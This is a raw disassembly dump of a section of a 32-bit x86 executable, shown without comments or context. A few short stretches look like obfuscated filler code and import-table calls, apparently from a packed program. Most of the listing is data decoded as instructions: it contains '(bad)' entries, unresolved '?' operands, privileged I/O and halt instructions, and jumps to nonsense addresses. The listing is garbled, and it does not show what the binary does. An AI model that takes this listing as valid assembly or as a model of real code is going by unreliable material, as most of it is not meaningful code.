  403dd1:	shrd   ecx,edx,0x2
  403dd5:	xor    DWORD PTR ds:0x4284d9,0x24cb
  403ddf:	shr    edx,0x2
  403de2:	and    edx,DWORD PTR ds:0x428561
  403de8:	mov    DWORD PTR [ebp-0x1c],ecx
  403deb:	mov    ecx,DWORD PTR [esi]
  403ded:	mov    edx,DWORD PTR [esi+0x4]
  403df0:	xor    DWORD PTR [ebp-0x1c],edi
  403df3:	xor    edx,edx
  403df5:	or     edx,DWORD PTR [ebp-0x1c]
  403df8:	sub    DWORD PTR ds:0x42840d,0x5e3f
  403e02:	shl    ecx,0x1e
  403e05:	sbb    DWORD PTR ds:0x42840d,0x5068
  403e0f:	add    edx,DWORD PTR [ebp-0x2c]
  403e12:	jmp    0x4041b3
  403e17:	bound  ecx,QWORD PTR [ebx-0x73d3f5ff]
  403e1d:	push   0xffffffab
  403e1f:	(bad)  
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	push   ss
  403e22:	rol    DWORD PTR [esp+esi*8],1
  403e25:	xor    bl,ch
  403e27:	mov    esi,0xbdbebef5
  403e2c:	les    edi,FWORD PTR [esi-0x695f0242]
  403e32:	mov    WORD PTR [eax],?
  403e34:	ins    DWORD PTR es:[edi],dx
  403e35:	lock cs pop ebp
  403e38:	mov    ebp,0x7bbcaf3d
  403e3d:	pop    es
  403e3e:	and    BYTE PTR [ebp+0x7e251dd1],0xe8
  403e45:	mov    esi,0xd0ebff04
  403e4a:	dec    esp
  403e4b:	or     BYTE PTR [ecx],0xfd
  403e4e:	dec    ebx
  403e4f:	dec    ebx
  403e50:	aas    
  403e51:	loope  0x403e35
  403e53:	sbb    ch,BYTE PTR ds:0xf59f1179
  403e59:	shl    BYTE PTR [eax],1
  403e5b:	aas    
  403e5c:	in     al,0x78
  403e5e:	mov    esp,0x49cecc92
  403e63:	fst    st(1)
  403e65:	hlt    
  403e66:	and    eax,0x48db1350
  403e6b:	in     eax,0xb9
  403e6d:	jo     0x403e4e
  403e6f:	mov    ecx,0xd05952ba
  403e74:	popf   
  403e75:	pop    edx
  403e76:	mov    ds:0xb4862e97,eax
  403e7b:	out    0xa3,eax
  403e7d:	ins    BYTE PTR es:[edi],dx
  403e7e:	mov    WORD PTR [ecx],?
  403e80:	call   0x58f:0x86662eb2
  403e87:	dec    edx
  403e88:	repnz adc ah,bh
  403e8b:	adc    eax,0xad062dc7
  403e90:	mov    esp,0x5706a982
  403e95:	mov    ds:0x1f1f7594,al
  403e9a:	push   eax
  403e9b:	shl    ebx,0xd
  403e9e:	jl     0x403ee1
  403ea0:	mov    cl,BYTE PTR [ecx+edi*4-0x29735dcf]
  403ea7:	ret    0x6b00
  403eaa:	pop    esi
  403eab:	adc    DWORD PTR [eax],ebx
  403ead:	imul   BYTE PTR [eax-0x173a6f8e]
  403eb3:	or     al,0xad
  403eb5:	push   eax
  403eb6:	pop    edi
  403eb7:	pop    eax
  403eb8:	xchg   ebp,eax
  403eb9:	std    
  403eba:	pop    ss
  403ebb:	mov    eax,0xcfa90960
  403ec0:	adc    BYTE PTR [ecx-0xfed7260],bh
  403ec6:	retf   
  403ec7:	jae    0x403eba
  403ec9:	mov    ecx,0x526bb4e2
  403ece:	hlt    
  403ecf:	push   0xffffffc8
  403ed1:	popf   
  403ed2:	add    al,BYTE PTR [edx+0x4]
  403ed5:	nop
  403ed6:	lods   eax,DWORD PTR ds:[esi]
  403ed7:	popf   
  403ed8:	mov    WORD PTR [ecx+0x3b],ss
  403edb:	imul   esi,DWORD PTR [esi+esi*2],0x3a9269df
  403ee2:	in     al,dx
  403ee3:	lds    eax,FWORD PTR [eax]
  403ee5:	jle    0x403eb9
  403ee7:	sub    al,0xa8
  403ee9:	adc    al,0xe2
  403eeb:	lds    edx,FWORD PTR [ebx]
  403eed:	xor    edx,edx
  403eef:	mov    WORD PTR [ebx+0x66ad60e3],?
  403ef5:	into   
  403ef6:	jae    0x403f3e
  403ef8:	or     DWORD PTR [eax+0x79cbe550],ecx
  403efe:	xor    BYTE PTR [ecx-0x63fc6785],0x30
  403f05:	(bad)  
  403f06:	sbb    ecx,DWORD PTR [ebx+0x75ac2d02]
  403f0c:	dec    ebp
  403f0d:	in     al,0xb2
  403f0f:	sub    eax,0x7a11fb1f
  403f14:	scas   al,BYTE PTR es:[edi]
  403f15:	cmp    eax,0xecf8b329
  403f1a:	pop    es
  403f1b:	iret   
  403f1c:	std    
  403f1d:	icebp  
  403f1e:	jmp    0xc0ce:0xdc253e5b
  403f25:	and    dl,BYTE PTR [eax+0x2c]
  403f28:	out    dx,eax
  403f29:	push   0x10882067
  403f2e:	out    0x48,eax
  403f30:	xchg   DWORD PTR [esi],esi
  403f32:	daa    
  403f33:	sub    al,0xa1
  403f35:	lea    ebx,fs:[edi+edi*8]
  403f39:	pop    ecx
  403f3a:	shl    DWORD PTR [esi],cl
  403f3c:	cli    
  403f3d:	mov    ebp,0xf245dce4
  403f42:	inc    ebx
  403f43:	out    0x2c,al
  403f45:	inc    edi
  403f46:	inc    edx
  403f48:	repz into 
  403f4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f4b:	jo     0x403f40
  403f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f4e:	push   ss
  403f4f:	inc    edx
  403f50:	pushf  
  403f51:	loop   0x403f65
  403f53:	ret    
  403f54:	or     bh,BYTE PTR [ecx-0xb51c59d]
  403f5a:	mov    edx,0xe93ef70f
  403f5f:	mov    dl,0xa9
  403f61:	mov    ds:0xad49f2d6,al
  403f66:	scas   eax,DWORD PTR es:[edi]
  403f67:	popa   
  403f68:	scas   eax,DWORD PTR es:[edi]
  403f69:	sbb    DWORD PTR [esi+ecx*8+0x2b],edi
  403f6d:	fsubrp st(6),st
  403f6f:	addr16 sub al,0xfe
  403f73:	jns    0x403f1e
  403f75:	xlat   BYTE PTR ds:[ebx]
  403f76:	ja     0x403fb7
  403f78:	cmc    
  403f79:	jle    0x403fca
  403f7b:	test   al,0x5d
  403f7d:	xor    edi,ebp
  403f7f:	or     BYTE PTR [ecx],bh
  403f81:	popa   
  403f82:	retf   
  403f83:	jmp    DWORD PTR [ebx]
  403f85:	fdiv   DWORD PTR [esi]
  403f87:	sbb    al,0xc5
  403f89:	nop
  403f8a:	xchg   ebp,eax
  403f8b:	shl    DWORD PTR [eax],cl
  403f8d:	jg     0x403fc0
  403f8f:	jle    0x403ffb
  403f91:	imul   edi,DWORD PTR [esi],0x1e5c92df
  403f97:	mov    ebx,0x14cd3273
  403f9c:	xor    BYTE PTR [ecx],ch
  403f9e:	pushf  
  403f9f:	xor    al,0x43
  403fa1:	dec    eax
  403fa2:	push   esp
  403fa3:	loope  0x403faf
  403fa5:	push   edi
  403fa6:	or     esp,DWORD PTR [eax-0x32]
  403fa9:	inc    ecx
  403faa:	enter  0xf97c,0x59
  403fae:	mov    bh,0xa0
  403fb0:	mov    dh,0x6f
  403fb2:	inc    ebp
  403fb3:	adc    edi,DWORD PTR [ebp+0x55]
  403fb6:	retf   
  403fb7:	mov    eax,DWORD PTR [edi]
  403fb9:	lods   eax,DWORD PTR ds:[esi]
  403fba:	cmc    
  403fbb:	into   
  403fbc:	dec    DWORD PTR [eax-0x2037bc39]
  403fc2:	inc    ebp
  403fc3:	mov    edx,0xd435cd53
  403fc8:	enter  0x76db,0xcd
  403fcc:	xor    eax,eax
  403fce:	mov    al,0x6a
  403fd0:	fnsave [ebx+0x743c184]
  403fd6:	sti    
  403fd7:	imul   edi,DWORD PTR [edx-0x1918e67],0x586c2f99
  403fe1:	aas    
  403fe2:	jg     0x40400e
  403fe4:	sub    eax,0x771ae719
  403fe9:	or     al,0xe7
  403feb:	outs   dx,BYTE PTR ds:[esi]
  403fec:	mov    BYTE PTR [esi+0x5a],bl
  403fef:	inc    ebx
  403ff0:	sub    ecx,DWORD PTR [edx+ecx*2]
  403ff3:	xor    BYTE PTR [eax+eiz*1+0x162aa8cc],ah
  403ffa:	mov    ebx,0x53ee41fc
  403fff:	sub    al,0x1a
  404001:	cmp    al,0xca
  404003:	mov    ?,WORD PTR [ebp+0x431709c6]
  404009:	cmp    DWORD PTR [edx+0x7f],ecx
  40400c:	dec    ebp
  40400d:	mov    ch,0x7c
  40400f:	and    DWORD PTR [esi],esi
  404011:	loop   0x404006
  404013:	push   bp
  404015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404016:	lahf   
  404017:	jmp    0x293f:0x835491d7
  40401e:	mov    cl,0xed
  404020:	jae    0x403fe1
  404022:	(bad)  
  404023:	ss push edx
  404025:	(bad)  
  404026:	sti    
  404027:	mov    ds:0x775bbb4e,al
  40402c:	stos   BYTE PTR es:[edi],al
  40402d:	sub    ebx,DWORD PTR [eax-0x7e]
  404030:	mov    ebx,0xac4f5146
  404035:	push   ebx
  404036:	xor    ah,BYTE PTR [esi+0x2721cc79]
  40403c:	js     0x404064
  40403e:	outs   dx,BYTE PTR ds:[esi]
  40403f:	mov    ebx,0xfdd7d5c0
  404044:	in     eax,dx
  404045:	lea    edi,[esi+ebx*1+0x8]
  404049:	mov    eax,0xc03760c3
  40404e:	mov    dl,0xec
  404050:	cmp    eax,0xeaffbb03
  404055:	rep outs dx,BYTE PTR ds:[esi]
  404057:	mov    edi,0xf2da88f0
  40405c:	ss jg  0x403fe3
  40405f:	jp     0x403fe4
  404061:	jle    0x404093
  404063:	iret   
  404064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404065:	mov    WORD PTR [ebp+0x5b],ds
  404068:	ins    BYTE PTR es:[edi],dx
  404069:	les    eax,FWORD PTR [edx-0x5c]
  40406c:	jmp    0x835ec8e7
  404071:	push   0x2d3f5e50
  404076:	add    BYTE PTR [esi-0x698944c6],bl
  40407c:	jg     0x404050
  40407e:	in     eax,0xd3
  404080:	scas   al,BYTE PTR es:[edi]
  404081:	xchg   edx,edx
  404083:	add    al,0xcf
  404085:	and    eax,0xfcc2a84a
  40408a:	dec    ebp
  40408b:	xchg   esp,eax
  40408c:	sub    BYTE PTR [ecx],al
  40408e:	inc    edi
  40408f:	popf   
  404090:	loopne 0x40406b
  404092:	call   0xc03c2c46
  404097:	xchg   eax,ecx
  404099:	movlps QWORD PTR [edi-0x7c41e000],xmm2
  4040a0:	cmc    
  4040a1:	lahf   
  4040a2:	adc    al,0xbc
  4040a4:	inc    ecx
  4040a5:	mov    eax,DWORD PTR [ebx+0x36]
  4040a8:	mov    al,0xf0
  4040aa:	mov    esp,0xd52b2982
  4040af:	int3   
  4040b0:	je     0x4040cb
  4040b2:	mov    edx,0xe64682b1
  4040b7:	adc    DWORD PTR [esi],esi
  4040b9:	jnp    0x40412d
  4040bb:	or     DWORD PTR [esi+edi*1+0x7097269b],ecx
  4040c2:	repnz retf 
  4040c4:	mov    edx,ecx
  4040c6:	cmp    edx,edi
  4040c8:	aas    
  4040c9:	(bad)  
  4040ca:	and    al,0x44
  4040cc:	repnz loope 0x4040b1
  4040cf:	push   ds
  4040d0:	(bad)  
  4040d1:	xlat   BYTE PTR ds:[ebx]
  4040d2:	loop   0x40406e
  4040d4:	lds    esp,FWORD PTR [ecx-0x4d9cd39b]
  4040da:	pslld  mm4,QWORD PTR [edi-0xb]
  4040de:	ret    0x4da5
  4040e1:	mov    BYTE PTR [esi+0x6586ba52],al
  4040e7:	xchg   edi,eax
  4040e8:	mov    esp,0x300f642a
  4040ed:	pop    ecx
  4040ee:	dec    esp
  4040ef:	mov    ss,WORD PTR [ebp+0x53a51513]
  4040f5:	mov    ds:0xf584954d,al
  4040fa:	int3   
  4040fb:	(bad)  
  4040fc:	dec    ebx
  4040fd:	lahf   
  4040fe:	pop    eax
  4040ff:	jmp    0xb60d4cf8
  404104:	xor    al,0xe7
  404106:	jp     0x404158
  404108:	imul   ebp,esp,0xffffff87
  40410b:	xor    BYTE PTR [ecx+eax*4-0x58],0x97
  404110:	arpl   bx,di
  404112:	xchg   ebp,eax
  404113:	sti    
  404114:	mov    ah,0xd3
  404116:	jo     0x404159
  404118:	cli    
  404119:	stc    
  40411a:	and    BYTE PTR [edi+0x516fa505],al
  404120:	or     DWORD PTR [ebx+0x53],edx
  404123:	xchg   ebx,eax
  404124:	xchg   esp,eax
  404125:	loopne 0x4040c2
  404127:	data16 outs dx,BYTE PTR ds:[esi]
  404129:	ss add eax,0x845be281
  40412f:	xlat   BYTE PTR ds:[ebx]
  404130:	out    0x31,eax
  404132:	(bad)  
  404133:	call   0xd628:0x9e5696f3
  40413a:	add    al,0xa2
  40413c:	das    
  40413d:	add    eax,0xe02df8f
  404142:	ret    
  404143:	push   ebp
  404144:	sub    eax,ebx
  404146:	mov    dl,bh
  404148:	mov    esi,DWORD PTR [esi+0x1e1819ec]
  40414e:	mov    bh,BYTE PTR [edx-0x2a]
  404151:	mov    ah,BYTE PTR [ebx-0x27]
  404154:	cmp    edi,ebx
  404156:	add    eax,0x8f070c72
  40415b:	inc    edx
  40415c:	cmp    bl,ah
  40415e:	enter  0x669b,0x53
  404162:	push   edi
  404163:	out    0x8e,al
  404165:	call   FWORD PTR [edx+0x27]
  404168:	int    0xf3
  40416a:	cmp    al,0x5b
  40416c:	test   DWORD PTR [esi],0x46de7498
  404172:	push   edx
  404173:	in     eax,dx
  404174:	xchg   ecx,eax
  404175:	div    DWORD PTR [esi+ecx*1]
  404178:	xlat   BYTE PTR ds:[ebx]
  404179:	dec    eax
  40417a:	inc    esp
  40417b:	lahf   
  40417c:	psadbw mm5,QWORD PTR [edx+0x1d]
  404180:	mov    eax,0x3f593047
  404185:	pop    esi
  404186:	push   ds
  404187:	in     eax,dx
  404188:	daa    
  404189:	test   eax,0xe968f6e6
  40418e:	mov    dl,0x9b
  404190:	jo     0x40414a
  404192:	dec    ecx
  404193:	aaa    
  404194:	outs   dx,BYTE PTR ds:[esi]
  404195:	inc    esp
  404196:	xor    edi,DWORD PTR [edi]
  404198:	mov    BYTE PTR [edi],al
  40419a:	addr16 call 0x4e7f0b2c
  4041a0:	shl    DWORD PTR [edx+0x4f],1
  4041a3:	addr16 jae 0x4041ca
  4041a6:	or     ax,0xfe8d
  4041aa:	push   edx
  4041ab:	ins    DWORD PTR es:[edi],dx
  4041ac:	aad    0x44
  4041ae:	mov    ecx,esi
  4041b0:	and    DWORD PTR [ebx+0x63],esi
  4041b3:	add    DWORD PTR [eax],edx
  4041b5:	cmp    DWORD PTR ds:0x428475,0x0
  4041bc:	not    ecx
  4041be:	mov    DWORD PTR ds:0x428331,0x38eb
  4041c8:	jmp    0x40423c
  4041cd:	mov    edx,DWORD PTR ds:0x4284cd
  4041d3:	cmp    DWORD PTR ds:0x428475,0x0
  4041da:	jne    0x40421e
  4041e0:	push   DWORD PTR [ebp-0x1c]
  4041e3:	push   0x3daa
  4041e8:	push   0x6a0e
  4041ed:	call   DWORD PTR ds:0x42dff8
  4041f3:	mov    edx,DWORD PTR ds:0x428425
  4041f9:	xor    edx,DWORD PTR ds:0x428561
  4041ff:	mov    DWORD PTR ds:0x428425,edx
  404205:	or     edx,DWORD PTR ds:0x428501
  40420b:	movzx  edx,WORD PTR ds:0x42843d
  404212:	and    DWORD PTR ds:0x428461,edx
  404218:	xor    ecx,0x6193
  40421e:	add    edx,0x3a4f
  404224:	add    DWORD PTR ds:0x428411,ecx
  40422a:	mov    ecx,DWORD PTR ds:0x4283dd
  404230:	mov    edx,DWORD PTR ds:0x428521
  404236:	sub    ecx,edx
  404238:	imul   ecx,DWORD PTR [ecx+edx*1]
  40423c:	mov    eax,DWORD PTR [esi]
  40423e:	cmp    DWORD PTR ds:0x428471,0x0
  404245:	mov    DWORD PTR ds:0x428365,0x80f
  40424f:	mov    DWORD PTR ds:0x428569,ecx
  404255:	jmp    0x4042b8
  40425a:	mov    DWORD PTR ds:0x42841d,0x4518
  404264:	cmp    DWORD PTR ds:0x428471,0x0
  40426b:	jb     0x404293
  404271:	push   DWORD PTR [ebp-0x10]
  404274:	call   DWORD PTR ds:0x42dffc
  40427a:	adc    edx,0x1a1
  404280:	xor    ecx,ecx
  404282:	add    ecx,DWORD PTR ds:0x4284b1
  404288:	mov    edx,DWORD PTR ds:0x4285a1
  40428e:	sub    ecx,edx
  404290:	xor    ecx,DWORD PTR [ecx+edx*1]
  404293:	add    DWORD PTR ds:0x42843d,0x3b89
  40429d:	sbb    DWORD PTR ds:0x428581,ecx
  4042a3:	sub    edx,edx
  4042a5:	movzx  ecx,WORD PTR ds:0x4284e9
  4042ac:	xor    ecx,DWORD PTR ds:0x428559
  4042b2:	mov    DWORD PTR ds:0x4284e9,ecx
  4042b8:	mov    ecx,DWORD PTR [esi+0x4]
  4042bb:	shrd   eax,ecx,0x2
  4042bf:	shr    ecx,0x2
  4042c2:	cmp    DWORD PTR ds:0x428579,0x0
  4042c9:	mov    DWORD PTR ds:0x4284e9,ecx
  4042cf:	mov    DWORD PTR ds:0x428479,0x365d
  4042d9:	jmp    0x404321
  4042de:	mov    DWORD PTR ds:0x428435,0x759d
  4042e8:	cmp    DWORD PTR ds:0x428579,0x0
  4042ef:	jae    0x404315
  4042f5:	call   DWORD PTR ds:0x42e248
  4042fb:	adc    edx,ecx
  4042fd:	mov    ecx,DWORD PTR ds:0x428429
  404303:	and    ecx,DWORD PTR ds:0x428565
  404309:	mov    DWORD PTR ds:0x428429,ecx
  40430f:	sbb    edx,DWORD PTR ds:0x428361
  404315:	sbb    DWORD PTR ds:0x428439,0x7721
  40431f:	add    ecx,ecx
  404321:	mov    ecx,DWORD PTR [esi]
  404323:	mov    edx,DWORD PTR [esi+0x4]
  404326:	xor    eax,edi
  404328:	shl    ecx,0x1e
  40432b:	xor    edx,edx
  40432d:	or     edx,eax
  40432f:	mov    DWORD PTR [ebp-0x4],edx
  404332:	mov    DWORD PTR [ebp-0x30],0xcb79b576
  404339:	mov    eax,0x9c2b8ae8
  40433e:	mov    DWORD PTR [ebp-0x2c],eax
  404341:	mov    DWORD PTR [ebp-0x20],0xcb79b572
  404348:	mov    DWORD PTR [ebp-0x1c],eax
  40434b:	mov    DWORD PTR [ebp-0x10],0xcb79b57e
  404352:	mov    DWORD PTR [ebp-0xc],eax
  404355:	mov    DWORD PTR [ebp-0x60],0xcb79b57a
  40435c:	mov    DWORD PTR [ebp-0x5c],eax
  40435f:	jmp    0x404700
  404364:	cmp    BYTE PTR [eax+0x14],dh
  404367:	cmp    al,0x9c
  404369:	mov    esp,0xa24d7438
  40436e:	mov    BYTE PTR [edi+eax*1-0x42303cd4],ah
  404375:	sti    
  404376:	mov    esi,0xbec4bdbe
  40437b:	mov    esi,0xc3ce432d
  404380:	xor    esp,ecx
  404382:	cs jl  0x4043db
  404385:	push   eax
  404386:	js     0x404349
  404388:	clc    
  404389:	pop    eax
  40438a:	out    0x3e,al
  40438c:	(bad)  [ecx+eax*1-0x65]
  404390:	fcomi  st,st(6)
  404392:	sbb    dl,al
  404394:	pop    esi
  404395:	aaa    
  404396:	fwait
  404397:	mov    ecx,0xe323689f
  40439c:	ret    
  40439d:	mov    al,ds:0x5cd12cf6
  4043a2:	or     bh,BYTE PTR [eax+edi*8]
  4043a5:	ror    BYTE PTR [edx+0x770b0c17],0xf
  4043ac:	add    DWORD PTR [esi-0x73],0x37ba4149
  4043b3:	test   eax,0xdbf31f5f
  4043b8:	mov    WORD PTR [esi+ecx*4+0x4b],cs
  4043bc:	xchg   ecx,eax
  4043bd:	add    eax,0xb9ff951
  4043c2:	in     eax,dx
  4043c3:	mov    edi,fs
  4043c5:	fucomi st,st(1)
  4043c7:	add    eax,0x8ecaff5
  4043cc:	push   edx
  4043cd:	out    dx,al
  4043ce:	sub    edx,DWORD PTR [ebx+esi*4+0x6c042786]
  4043d5:	push   edx
  4043d6:	jbe    0x404430
  4043d8:	les    ebx,FWORD PTR [esi+esi*2+0x48]
  4043dc:	mov    al,0x5d
  4043de:	mov    ds:0x5315b232,al
  4043e3:	xchg   edx,eax
  4043e4:	mov    WORD PTR [ecx+0x5615ecaf],fs
  4043ea:	fld    st(5)
  4043ec:	imul   esi,DWORD PTR [ebx+ecx*1],0xffffffb4
  4043f0:	add    al,0x22
  4043f2:	rcl    DWORD PTR [edi-0x4a15578d],cl
  4043f8:	mov    al,ds:0x90de46ac
  4043fd:	xor    DWORD PTR [esi],edx
  4043ff:	ja     0x404442
  404401:	or     esp,DWORD PTR [edx-0xf]
  404404:	pop    es
  404405:	xchg   edi,eax
  404406:	sbb    eax,0xfe5c6748
  40440b:	mov    al,0xde
  40440d:	and    eax,0x5bad1870
  404412:	shr    ch,1
  404414:	imul   ecx,DWORD PTR [ecx+0xcd79be1],0xffffff8a
  40441b:	loopne 0x4043b2
  40441d:	adc    al,0xf4
  40441f:	xchg   edx,eax
  404420:	inc    eax
  404421:	cmp    BYTE PTR [edi-0x1bf253aa],bl
  404427:	imul   ebx,DWORD PTR [esi+0xf686ec2],0x6301e9c2
  404431:	cmp    dl,BYTE PTR [edx]
  404433:	imul   edi,esp,0x12
  404436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404437:	cmc    
  404438:	rcl    BYTE PTR fs:[ebp+0x6d],0xf4
  40443d:	das    
  40443e:	xor    edx,DWORD PTR [ecx]
  404440:	scas   al,BYTE PTR es:[edi]
  404441:	jmp    DWORD PTR [esi]
  404443:	out    dx,al
  404444:	frstor [ebp+0x6a]
  404447:	add    BYTE PTR [esp+edi*4-0x214901cf],0x4f
  40444f:	popa   
  404450:	sub    ebx,DWORD PTR [esi-0x2e]
  404453:	popa   
  404454:	fisttp QWORD PTR [esi]
  404456:	sahf   
  404457:	dec    esi
  404458:	repz bound eax,QWORD PTR [esi]
  40445b:	test   dh,bh
  40445d:	pop    eax
  40445e:	in     eax,0xfc
  404460:	out    0xd3,eax
  404462:	repnz call 0x56ef:0x5f4c55a0
  40446a:	lods   eax,DWORD PTR ds:[esi]
  40446b:	fs pop es
  40446d:	add    cl,BYTE PTR [edi-0x56881807]
  404473:	in     eax,0x1b
  404475:	pop    ecx
  404476:	ins    BYTE PTR es:[edi],dx
  404477:	xchg   ebx,eax
  404478:	or     eax,0xe914892b
  40447d:	js     0x404449
  40447f:	bound  edx,QWORD PTR ds:0x8d1ebc49
  404485:	cdq    
  404486:	neg    BYTE PTR [esi+0x24]
  404489:	sti    
  40448a:	xor    bh,BYTE PTR [eax+ebp*8]
  40448d:	mov    ds:0x3ee3db,eax
  404493:	daa    
  404494:	scas   eax,DWORD PTR es:[edi]
  404495:	push   ds
  404496:	test   ecx,ebx
  404498:	adc    edi,edx
  40449a:	loopne 0x404470
  40449c:	inc    edi
  40449d:	inc    ebp
  40449e:	dec    edx
  40449f:	jns    0x40448e
  4044a1:	mov    esi,DWORD PTR [esi+0x6dcbb3f6]
  4044a7:	rcr    ah,0x59
  4044aa:	dec    ebp
  4044ab:	and    ebx,DWORD PTR [edi]
  4044ad:	scas   eax,DWORD PTR es:[edi]
  4044ae:	adc    ah,dh
  4044b0:	shr    BYTE PTR [esi+0x60],cl
  4044b3:	loope  0x40451a
  4044b5:	test   ebp,edi
  4044b7:	nop
  4044b8:	xor    BYTE PTR [eax+0x7b2c3205],cl
  4044be:	xchg   DWORD PTR [edx+0x53],esp
  4044c1:	mov    ch,BYTE PTR [eax+0x2c]
  4044c4:	add    eax,0x4198ca99
  4044c9:	inc    ecx
  4044ca:	popa   
  4044cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044cc:	add    DWORD PTR [edx-0x6b],ecx
  4044cf:	mov    dh,0xc3
  4044d1:	(bad)  
  4044d2:	sbb    eax,0xf853cd4e
  4044d7:	inc    ebx
  4044d8:	clc    
  4044d9:	jle    0x404468
  4044db:	mov    ebx,0x8222a4c8
  4044e0:	jge    0x404536
  4044e2:	inc    edi
  4044e3:	or     eax,0x45d8970b
  4044e8:	sub    dh,BYTE PTR [esi-0x4df83bb2]
  4044ee:	add    ch,dh
  4044f0:	icebp  
  4044f1:	sub    BYTE PTR [edx+esi*4-0x68],al
  4044f5:	sub    eax,0xc5e3e505
  4044fa:	bound  esi,QWORD PTR [edx-0x26]
  4044fd:	add    ebx,esp
  4044ff:	scas   eax,DWORD PTR es:[edi]
  404500:	cmp    DWORD PTR ds:0x1c6c7e6f,0x2a4462e0
  40450a:	(bad)  
  40450b:	and    ebp,DWORD PTR [eax]
  40450d:	and    eax,0x1e2cfd83
  404512:	mov    cl,0xd1
  404514:	sbb    BYTE PTR [edi],bl
  404516:	push   ds
  404517:	dec    edi
  404518:	mov    cl,0x3d
  40451a:	inc    esp
  40451b:	or     DWORD PTR [ebx+0x196be5d4],ebp
  404521:	and    al,0x57
  404523:	push   ds
  404524:	add    DWORD PTR [edx-0x61985fba],eax
  40452a:	dec    BYTE PTR [esi-0x26]
  40452d:	imul   ebp,DWORD PTR [ebx+0x77],0xffffffc0
  404531:	inc    ecx
  404532:	jge    0x404566
  404534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404535:	and    al,0x13
  404537:	inc    ecx
  404538:	imul   esp,DWORD PTR [ebx-0x29],0xf7c6557e
  40453f:	dec    ecx
  404540:	push   esp
  404541:	shr    DWORD PTR [ebx],0x8
  404544:	out    dx,eax
  404545:	pop    eax
  404546:	mov    bh,0xb1
  404548:	in     al,dx
  404549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454a:	fldcw  WORD PTR [ebx-0x3f]
  40454d:	fsqrt  
  40454f:	pop    edi
  404550:	xor    cl,BYTE PTR [ecx+0x56]
  404553:	cs inc esi
  404555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404556:	es ja  0x40458b
  404559:	mov    edx,0x6664137e
  40455e:	adc    edx,DWORD PTR ss:[eax-0x3c9a9c8a]
  404565:	in     eax,dx
  404566:	xor    esp,DWORD PTR [ebx]
  404568:	in     al,dx
  404569:	mov    dl,ah
  40456b:	dec    edi
  40456c:	les    eax,FWORD PTR [eax]
  40456e:	mul    ebx
  404570:	and    eax,esp
  404572:	push   esi
  404573:	(bad)  
  404575:	call   0x96d8ce02
  40457a:	cli    
  40457b:	mov    ds:0x3e043ad1,al
  404580:	imul   esi,DWORD PTR [ebp-0x4f],0x7b
  404584:	pop    esi
  404585:	and    eax,0x3b4a6d2c
  40458a:	or     DWORD PTR [ecx-0x290720d8],edx
  404590:	mov    edi,0x1c6a19a0
  404595:	push   eax
  404596:	push   cs
  404597:	sub    dh,BYTE PTR [ecx+0x78]
  40459a:	sbb    cl,cl
  40459c:	fld    TBYTE PTR [edx+0x304c78c3]
  4045a2:	xchg   edi,eax
  4045a3:	add    edx,DWORD PTR [edi]
  4045a5:	dec    edi
  4045a6:	je     0x404574
  4045a8:	jmp    0x74fb36b7
  4045ad:	jmp    0x404589
  4045af:	dec    ecx
  4045b0:	retf   
  4045b1:	adc    DWORD PTR [ecx+0x28],edi
  4045b4:	ds cmp dl,al
  4045b7:	aas    
  4045b8:	out    0xf2,eax
  4045ba:	adc    ebp,ebx
  4045bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045bd:	in     al,0x38
  4045bf:	sub    DWORD PTR ds:0x85a61870,edi
  4045c5:	cs ins DWORD PTR es:[edi],dx
  4045c7:	aas    
  4045c8:	stos   DWORD PTR es:[edi],eax
  4045c9:	lock sbb eax,0xd403223c
  4045cf:	sbb    al,0x36
  4045d1:	cld    
  4045d2:	cmp    ecx,eax
  4045d4:	push   ebp
  4045d5:	jne    0x40462a
  4045d7:	stc    
  4045d8:	mov    ecx,0x68b191d3
  4045dd:	sahf   
  4045de:	mov    ds:0x11a5d19c,al
  4045e3:	mov    eax,ds:0xa35d8eb7
  4045e8:	stc    
  4045e9:	gs add edx,edx
  4045ec:	stos   BYTE PTR es:[edi],al
  4045ed:	mov    ah,0x15
  4045ef:	ss in  eax,0xc
  4045f2:	mov    dl,0xeb
  4045f4:	ss je  0x4045ac
  4045f7:	sbb    esi,DWORD PTR [ecx-0x48]
  4045fa:	dec    esp
  4045fb:	sub    esp,0x607bfce0
  404601:	in     al,dx
  404602:	int    0xa2
  404604:	ins    BYTE PTR es:[edi],dx
  404605:	sti    
  404606:	adc    DWORD PTR [eax-0x5f],0x54
  40460a:	sub    esp,DWORD PTR [ecx-0x5e6c86f4]
  404610:	retf   0xb2eb
  404613:	es std 
  404615:	xchg   ebp,eax
  404616:	inc    edx
  404617:	sub    eax,0x1801baf3
  40461c:	ret    
  40461d:	jno    0x4045e3
  40461f:	in     al,0xa9
  404621:	mov    DWORD PTR [ecx+ebx*4+0x2a],esp
  404625:	push   ds
  404626:	xor    esi,esi
  404628:	fstp   QWORD PTR [eax]
  40462a:	mov    ds:0x97c90eb3,al
  40462f:	pusha  
  404630:	(bad)  
  404631:	cmp    esi,DWORD PTR [edx]
  404633:	push   ecx
  404634:	inc    ebp
  404635:	ins    BYTE PTR es:[edi],dx
  404636:	aad    0x8c
  404638:	adc    cl,BYTE PTR [esi-0x1d229d75]
  40463e:	call   0x3a9b0aa2
  404643:	and    al,0xb2
  404645:	ds inc ecx
  404647:	jg     0x4045f3
  404649:	ret    0xe07c
  40464c:	hlt    
  40464d:	xchg   esp,eax
  40464e:	gs push ecx
  404650:	std    
  404651:	mov    cl,0xb4
  404653:	adc    BYTE PTR [edx+0x2fbb113c],dh
  404659:	pushf  
  40465a:	test   esp,ebp
  40465c:	mov    bl,0xcf
  40465e:	pop    edx
  40465f:	jnp    0x40464d
  404661:	jle    0x404673
  404663:	and    al,0x7d
  404665:	inc    esi
  404666:	and    BYTE PTR [edx],bh
  404668:	cdq    
  404669:	sbb    cl,BYTE PTR [ebx+0x2fd6d58]
  40466f:	inc    ecx
  404670:	in     eax,dx
  404671:	test   al,0x60
